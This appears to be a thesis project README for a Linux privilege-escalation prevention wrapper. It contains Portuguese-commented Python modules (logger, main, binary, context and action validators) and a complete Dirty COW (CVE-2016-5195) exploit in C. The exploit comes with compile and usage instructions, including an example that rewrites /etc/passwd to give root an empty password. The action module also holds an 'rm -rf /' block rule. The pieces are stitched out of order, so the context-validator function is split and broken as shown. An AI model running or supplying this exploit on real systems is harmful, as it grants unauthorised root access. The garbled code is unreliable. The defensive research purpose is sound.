# thesis_dirtyc0w_model
Model that prevent privilege escalation


------------------------------------------
LOGGER

import datetime

LOG_FILE = "/var/log/tef.log"

def log_event(event):
    """
    Regista um evento no ficheiro de log com data/hora.
    :param event: Texto do evento a registar
    """
    with open(LOG_FILE, "a") as log:
        log.write(f"{datetime.datetime.now()} - {event}\n")


------------------------------------------------------
MAIN

#!/usr/bin/env python3
import sys
import os

from context_validator import validate_context
from binary_validator import validate_binary
from action_authorizer import authorize_action
from logger import log_event

def main():
    if len(sys.argv) < 2:
        print("[TEF] Erro: Nenhum comando fornecido.")
        sys.exit(1)

    command = sys.argv[1]
    arguments = sys.argv[1:]

    # Camada 1 - Verificação de contexto
    if not validate_context():
        print("[TEF] Bloqueado: execução em contexto não autorizado.")
        log_event(f"[BLOQUEADO] Contexto não autorizado para {command}")
        sys.exit(1)

    # Camada 2 - Validação de binário
    if not validate_binary(command):
        print(f"[TEF] Bloqueado: {command} não está autorizado.")
        log_event(f"[BLOQUEADO] Binário não autorizado: {command}")
        sys.exit(1)

    # Camada 3 - Autorização de ação
    if not authorize_action(command, arguments):
        print(f"[TEF] Bloqueado: ação não autorizada ({' '.join(arguments)})")
        log_event(f"[BLOQUEADO] Ação não autorizada: {arguments}")
        sys.exit(1)

    # Se tudo passou, executa o comando real
    log_event(f"[PERMITIDO] {command} {' '.join(arguments)}")
    os.execvp(command, arguments)

if __name__ == "__main__":
    main()
---------------------------------------------------------
ACTION


def authorize_action(command, arguments):
    """
    Autoriza ou bloqueia ações específicas mesmo quando o binário é válido.
    Aqui podes definir regras adicionais (ex.: parâmetros proibidos, horários).
    :param command: Binário que vai ser executado
    :param arguments: Lista de argumentos passados ao comando
    :return: True se a ação for permitida, False caso contrário
    """
    # Exemplo: bloquear se tentar usar 'rm -rf /'
    if command == "/bin/rm" and "-rf" in arguments and "/" in arguments:
        return False

    # Neste protótipo, todas as ações passam se não houver regra explícita a bloquear
    return True
----------------------------------------------
BINARY

# Lista de binários autorizados a executar com privilégios elevados
SAFE_BINARIES = [
    "/usr/bin/sudo",
    "/usr/bin/passwd"
]

def validate_binary(command):
    """
    Verifica se o binário solicitado está autorizado.
    :param command: Caminho completo do binário
    :return: True se for permitido, False caso contrário
    """
    return command in SAFE_BINARIES
-----------------------------------------------------

CONTEXT

import os

def validate_context():
    """
    Verifica se a execução está a ocorrer num contexto autorizado.
    Exemplo simples: bloquear execução remota via SSH.
    :return: True se o contexto for válido, False caso contrário
    """
    # Bloqueia execuções feitas através de ligação SSH
    if os.getenv("SSH_CONNECTION"):
        return False


--------------------------------------------

EXPLOIT

/*
 * dirtyc0w.c
 *
 * Exploit PoC para CVE-2016-5195 (Dirty COW)
 * 
 * Uso:
 *   gcc -pthread dirtyc0w.c -o dirtyc0w
 *   ./dirtyc0w <ficheiro alvo> <conteúdo novo>
 *
 * Exemplo:
 *   ./dirtyc0w /etc/passwd "root::0:0:root:/root:/bin/bash\n"
 */

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

void *map;
char *payload;
struct stat st;
int fd;

void *madviseThread(void *arg) {
    for (int i = 0; i < 1000000; i++)
        madvise(map, st.st_size, MADV_DONTNEED);
    return NULL;
}

void *writeThread(void *arg) {
    int f = open("/proc/self/mem", O_RDWR);
    for (int i = 0; i < 1000000; i++) {
        lseek(f, (off_t)map, SEEK_SET);
        write(f, payload, strlen(payload));
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Uso: %s <ficheiro alvo> <conteúdo novo>\n", argv[0]);
        return 1;
    }

    payload = argv[2];
    fd = open(argv[1], O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    fstat(fd, &st);

    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    pthread_t t1, t2;
    pthread_create(&t1, NULL, madviseThread, NULL);
    pthread_create(&t2, NULL, writeThread, NULL);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    printf("[+] Exploit terminado. Verifica o ficheiro!\n");
    return 0;
}



    # Poderias adicionar aqui outras regras de contexto:
    # - Terminal físico vs remoto
    # - Sessão interativa vs scripts automáticos
    return True


